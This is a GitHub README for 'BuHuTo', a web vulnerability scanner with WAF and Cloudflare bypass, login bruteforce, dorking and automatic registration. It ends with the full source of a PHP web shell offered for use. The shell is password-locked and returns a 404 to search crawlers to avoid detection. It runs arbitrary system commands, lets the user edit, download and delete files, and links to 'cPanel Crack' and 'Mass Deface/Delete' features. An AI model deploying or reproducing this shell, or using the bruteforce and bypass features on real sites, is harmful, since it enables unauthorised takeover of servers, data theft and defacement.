## **BuHuTo (Bug Hunter Tools) V1.0**

## Key Features

* **Interactive Menu:** An easy-to-use interface (`buhuto.py`) to run various scan modes.
* **Flexible Scan Modes:**
* **Full Scan:** Runs all modules, deep scan, port scan, CF bypass, and auto-register.
* **Specific Module Scan:** Allows you to run only specific modules (e.g., `xss`, `sqli`, `ssrf_internal`).
* **In-Depth Reconnaissance:**
* Integration with **subfinder** for subdomain discovery.
* Integration with **httpx** to find live web servers.
* **Dynamic Crawling:** Uses **Playwright** for deep crawling on modern (JavaScript-heavy) web applications to discover more endpoints and parameters.
* **External Tool Integration:**
* Uses **Nuclei** for template-based scanning.
* Uses **Nmap** for port scanning and service detection.
* **Bypass & Evasion:**
* Includes CloudFlare bypass attempts (using `cloudscraper` and Playwright).
* Uses various User-Agents and WAF Bypass payloads.
* **Comprehensive Reporting:** Automatically generates reports in multiple formats (`.html`, `.json`, `.md`, `.csv`) in the `scan_results` directory, complete with an interactive dashboard.
* **Configurable:** All payloads and settings (like common paths, API paths, and user agents) can be customized via the `config.json` file.
* **Other Features:** Includes a proxy downloader, login bruteforce, and automatic user registration attempts.

## Modules (Vulnerabilities Checked)

`BugHunterPro` (`tools.py`) comes with modules to test a wide range of vulnerability categories:

* **Injection:**
* Cross-Site Scripting (XSS)
* SQL Injection (Error-based & Time-based)
* Server-Side Template Injection (SSTI)
* OS Command Injection
* CRLF Injection
* NoSQL Injection
* XML External Entity (XXE)
* **Broken Access Control:**
* Insecure Direct Object Reference (IDOR)
* Local File Inclusion (LFI)
* Remote File Inclusion (RFI)
* Cross-Site Request Forgery (CSRF)
* **Server-Side Request Forgery (SSRF):**
* Regular SSRF checks
* Out-of-Band (OAST) SSRF checks
* Internal service access checks
* **Security Misconfiguration:**
* Missing Security Headers
* CORS Misconfiguration
* Insecure File Upload
* GraphQL Introspection
* OAuth Misconfiguration
* Default Credentials
* **Data Exposure & Leaks:**
* API Token Leaks (in JS files)
* API Endpoint Leakage
* Session Fixation
* **Miscellaneous:**
* Open Redirect
* JWT Misconfiguration
* Prototype Pollution
* WAF Bypass

## Installation

1.  **Clone this repository:**

```bash
git clone https://github.com/ALIF101XL/BuHuTo.git && cd BuHuTo/
```

2.  **Install Python dependencies:**
Make sure you have **Python 3.8+**.

```bash
pip install -r requirements.txt
```

3.  **Install Playwright browsers:**
(Note: Playwright is currently disabled in `misc/tools.py` but required for full functionality if re-enabled).

```bash
playwright install
```

4.  **Install External Dependencies (REQUIRED):**
This tool relies on several popular Go-based tools. Ensure you have [Go installed](https://go.dev/doc/install) and your `GOPATH` is set up correctly.

```bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Install subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Install httpx
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

You also need **Nmap**. Install it using your system's package manager:

```bash
# On Debian/Ubuntu
sudo apt update && sudo apt install nmap

# On macOS (using Homebrew)
brew install nmap
```

**IMPORTANT:** Ensure all these binaries (`nuclei`, `subfinder`, `httpx`, `nmap`) are accessible from your system's `PATH`.

## Usage

### 1. Graphical User Interface (GUI)

For a more user-friendly experience, you can use the graphical interface.

```bash
python3 buhuto-gui.py
```

The GUI provides an easy way to:
-   **Start Scans**: Input a target URL and specific modules.
-   **Manage Processes**: Start and stop scans with dedicated buttons.
-   **View Logs**: See real-time logs directly in the application window.
-   **Download Proxies**: Update your proxy list with a single click.

### 2. Primary Usage (Interactive Menu)

Run the `buhuto.py` script to display the menu:

```bash
python3 buhuto.py
```

#### Menu Options

* **[1] Scan URL (Full Scan)**

* Asks for a target URL.
* Runs a full scan using `tools.py` with all features enabled (`--deep-scan`).
* You will be asked if you want to include the SSRF scan (which can be time-consuming).

* **[2] Scan URL (Specific Module)**

* Asks for a target URL and the name of the module to run.
* Module examples: `xss`, `sqli`, `lfi`, `ssrf_internal`, `security_headers`.
* See the full list of modules below or in `tools.py` (the `run_specific_module` function).

* **[3] Gather Targets (Dorking & Indexing)**

* Runs the `misc/indexing.py` script to gather targets based on dorks in `payloads/dork.txt`.
* Results are saved in the `scan_results` directory.

* **[4] Update Proxies**

* Runs the `misc/downloader.py` script to download a new proxy list.

* **[5] Mass Scan from Crawled URLs**

* Runs a full scan on all URLs found in `crawled_urls.txt`.

* **[0] Exit**

* Exits the application.

### 2\. Advanced Usage (Directly via `tools.py`)

You can also run `tools.py` directly for more granular control.

**Example: Run a specific module with a cookie**

```bash
python3 misc/tools.py https://target.com --module xss --cookie "session=..."
```

**Example: Run multiple modules**

```bash
python3 misc/tools.py https://target.com --modules "lfi,sqli,ssti"
```

**Example: Run a full scan (like Option 2) from the command line**

```bash
python3 misc/tools.py https://target.com --deep-scan --cf-bypass --auto-register --yes
```

Use `-h` to see all available flags:

```bash
python3 misc/tools.py -h
```

```
xss, sqli, ssti, lfi, rfi, crlf, command_injection, xxe, nosql_injection, ssrf, ssrf_internal, open_redirect, csrf, idor, file_upload, cors, graphql, default_creds, oauth, security_headers, waf_bypass, api_leakage, jwt, prototype_pollution, session_fixation, api_token_leak
```

### Configuration

You can customize payloads, user-agents, and paths by editing the `config.json` file directly.

### **BuHuTo Shell**

```
<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$password = "339c6fa7e21e3d30fea165ab02568164"; // md5: BuHuTo
$SERVERIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']);
$FILEPATH = str_replace($_SERVER['DOCUMENT_ROOT'], "", getcwd());

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
$userAgents = ["Googlebot",
"Slurp",
"MSNBot",
"PycURL",
"facebookexternalhit",
"ia_archiver",
"crawler",
"Yandex",
"Rambler",
"Yahoo! Slurp",
"YahooSeeker",
"bingbot",
"curl"];
if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
header('HTTP/1.0 404 Not Found');
exit;
}
}

// Login Shell
function login_shell() {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BuHuTo Shell</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
body {
background-color: #000000;
color: #11ff27;
}
.ascii-art {
font-family: monospace;
white-space: pre;
}
</style>
</head>
<body class="flex items-center justify-center min-h-screen">
<div class="text-center">
<div class="ascii-art text-green-500 mb-4">
___________________________
root:~# ...................
---------------------------
</div>
<form method="post" class="mt-4">
<input type="password" name="password" class="border border-green-500 bg-transparent text-red-500 text-center p-2 rounded" placeholder="Enter Password">
<button type="submit" class="mt-2 bg-green-500 text-black p-2 rounded hover:bg-green-600">Login</button>
</form>
</div>
</body>
</html>
<?php
exit;
}

// Session Authentication
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
if (empty($password) || (isset($_POST['password']) && md5($_POST['password']) === $password)) {
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
} else {
login_shell();
}
}

// File Download
if (isset($_GET['file']) && $_GET['file'] != '' && $_GET['act'] == 'download') {
@ob_clean();
$file = $_GET['file'];
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($file));
readfile($file);
exit;
}

// Strip slashes if magic quotes is enabled
if (get_magic_quotes_gpc()) {
function idx_ss($array) {
return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
}
$_POST = idx_ss($_POST);
}

// Utility Functions
function path() {
return isset($_GET['dir']) ? str_replace("\", "/", $_GET['dir']) : str_replace("\", "/", getcwd());
}

function color($string, $color = 'text-green') {
return " < span class = '$color' > $string < /span > ";
}

function OS() {
return strtoupper(substr(PHP_OS, 0, 3)) === "WIN" ? "Windows" : "Linux";
}

function exe($cmd) {
$output = '';
if (function_exists('system')) {
@ob_start();
@system($cmd);
$output = @ob_get_clean();
} elseif (function_exists('exec')) {
@exec($cmd, $results);
$output = implode("\n", $results);
} elseif (function_exists('passthru')) {
@ob_start();
@passthru($cmd);
$output = @ob_get_clean();
} elseif (function_exists('shell_exec')) {
$output = @shell_exec($cmd);
}
return $output;
}

function save($filename, $mode, $content) {
$handle = fopen($filename, $mode);
fwrite($handle, $content);
fclose($handle);
}

function hddsize($size) {
if ($size >= 1073741824) return sprintf('%.2f', $size / 1073741824) . ' GB';
if ($size >= 1048576) return sprintf('%.2f', $size / 1048576) . ' MB';
if ($size >= 1024) return sprintf('%.2f', $size / 1024) . ' KB';
return $size . ' B';
}

function hdd() {
return (object) [
'size' => hddsize(disk_total_space("/")),
'free' => hddsize(disk_free_space("/")),
'used' => hddsize(disk_total_space("/") - disk_free_space("/"))
];
}

function perms($path) {
$perms = fileperms($path);
$info = '';
if (($perms & 0xC000) == 0xC000) $info = 's';
elseif (($perms & 0xA000) == 0xA000) $info = 'l';
elseif (($perms & 0x8000) == 0x8000) $info = '-';
elseif (($perms & 0x6000) == 0x6000) $info = 'b';
elseif (($perms & 0x4000) == 0x4000) $info = 'd';
elseif (($perms & 0x2000) == 0x2000) $info = 'c';
elseif (($perms & 0x1000) == 0x1000) $info = 'p';
else $info = 'u';

$info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
return $info;
}

function writeable($path, $perms) {
return is_writable($path) ? color($perms, 'text-green-500') : color($perms, 'text-red-500');
}

// Main Interface
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width = device-width, initial-scale = 1.0">
<title>BugHunter Shell</title>
<script src="https://cdn.tailwindcss.com"></script> < style >
body {
background-color: #000000; color: #00fb2f; font-family: 'Courier New', monospace; }
.table-auto th, .table-auto td {
border: 1px solid #ec0000; padding: 8px; }
.table-auto th {
background-color: #000000; color: #00fa0b; }
.table-auto tr:hover {
background-color: #000000; }
textarea, input[type = "text"] {
background: transparent; border: 1px solid #f60000; color: #2bfffe; }
button, input[type = "submit"] {
background-color: #000000; color: #0049da; }
button:hover, input[type = "submit"]:hover {
background-color: #012612; } < /style > < script >
function executeCommand() {
const cmd = document.getElementById('cmdInput').value;
fetch('?do=cmd&dir=<?php echo path(); ?>', {
method: 'POST',
headers: {
'Content-Type': 'application/x-www-form-urlencoded'
},
body: 'cmd=' + encodeURIComponent(cmd)
})
.then(response => response.text())
.then(data => {
document.getElementById('cmdOutput').innerHTML = data;
});
} < /script > < /head > < body class = "p-4" > < div class = "max-w-7xl mx-auto" > < h1 class = "text-2xl text-green-500 mb-4" > BugHunter Shell < /h1 > < div class = "mb-4" > < p > SERVER IP: < ?php echo color($SERVERIP, 'text-green-500'); ?> | YOUR IP: <?php echo color($_SERVER['REMOTE_ADDR'], 'text-green-500'); ?>
</p>
<p>
WEB SERVER: <?php echo color($_SERVER['SERVER_SOFTWARE'], 'text-green-500'); ?>
</p>
<p>
SYSTEM: <?php echo color(php_uname(), 'text-green-500'); ?>
</p>
<p>
HDD: <?php echo color(hdd()->used, 'text-green-500'); ?> / <?php echo color(hdd()->size, 'text-green-500'); ?> (Free: <?php echo color(hdd()->free, 'text-green-500'); ?>)
</p>
<p>
PHP VERSION: <?php echo color(phpversion(), 'text-green-500'); ?>
</p>
<p>
Current Dir: <?php echo color(path(), 'text-green-500'); ?> [<?php echo writeable(path(), perms(path())); ?>]
</p>
</div>

<div class="mb-4">
<input id="cmdInput" type="text" class="w-full p-2 rounded" placeholder="Enter command...">
<button onclick="executeCommand()" class="mt-2 p-2 rounded">Execute</button>
<pre id="cmdOutput" class="mt-2 bg-gray-800 p-4 rounded"></pre>
</div>

<div class="mb-4">
<ul class="flex space-x-4">
<li><a href="?" class="text-white hover:text-yellow-500">Home</a></li>
<li><a href="?dir=<?php echo path(); ?>&do=fakeroot" class="text-white hover:text-yellow-500">Fake Root</a></li>
<li><a href="?dir=<?php echo path(); ?>&do=cpanel" class="text-white hover:text-yellow-500">cPanel Crack</a></li>
<li><a href="?dir=<?php echo path(); ?>&do=mass" class="text-white hover:text-yellow-500">Mass Deface/Delete</a></li>
</ul>
</div>

<table class="table-auto w-full">
<thead>
<tr>
<th>Name</th>
<th>Type</th>
<th>Size</th>
<th>Last Modified</th>
<th>Permissions</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<?php
$dir = scandir(path());
foreach ($dir as $item) {
$itemPath = path() . DIRECTORY_SEPARATOR . $item;
if (is_dir($itemPath)) {
$type = 'dir';
$size = '-';
$actions = ($item === '.' || $item === '..')
? "<a href='?act=newfile&dir=" . path() . "'>newfile</a> | <a href='?act=newfolder&dir=" . path() . "'>newfolder</a>"
: "<a href='?act=rename_folder&dir=$itemPath'>rename</a> | <a href='?act=delete_folder&dir=$itemPath'>delete</a>";
} else {
$type = 'file';
$size = round(filesize($itemPath) / 1024, 2) . ' KB';
$actions = "<a href='?act=edit&dir=" . path() . "&file=$itemPath'>edit</a> | <a href='?act=rename&dir=" . path() . "&file=$itemPath'>rename</a> | <a href='?act=download&dir=" . path() . "&file=$itemPath'>download</a> | <a href='?act=delete&dir=" . path() . "&file=$itemPath'>delete</a>";
}
$time = date("F d Y g:i:s", filemtime($itemPath));
$perms = writeable($itemPath, perms($itemPath));
$link = is_dir($itemPath) ? "<a href='?dir=$itemPath'>$item</a>" : "<a href='?act=view&dir=" . path() . "&file=$itemPath'>$item</a>";
?>
<tr>
<td><?php echo $link; ?></td>
<td class="text-center"><?php echo $type; ?></td>
<td class="text-center"><?php echo $size; ?></td>
<td class="text-center"><?php echo $time; ?></td>
<td class="text-center"><?php echo $perms; ?></td>
<td class="text-center"><?php echo $actions; ?></td>
</tr>
<?php
}
?>
</tbody>
</table>
</div>
</body>
</html>
<?php
// File Actions
if (isset($_GET['act'])) {
if ($_GET['act'] === 'edit' && isset($_POST['save'])) {
$save = file_put_contents($_GET['file'], $_POST['src']);
echo $save ? color("File Saved!", 'text-green-500') : color("Permission Denied!", 'text-red-500');
}
if ($_GET['act'] === 'newfile' && isset($_POST['save'])) {
$filename = htmlspecialchars($_POST['filename']);
$fopen = fopen($filename, "a+");
echo $fopen ? "<script>window.location='?act=edit&dir=" . path() . "&file=$filename';</script>" : color("Permission Denied!", 'text-red-500');
}
}
?>
```


### Connect With Me

<p>
  <a href="https://x.com/ALIF101XL"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" /></a>
<a href="https://discord.com/users/alif101xl"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" /></a>
</p>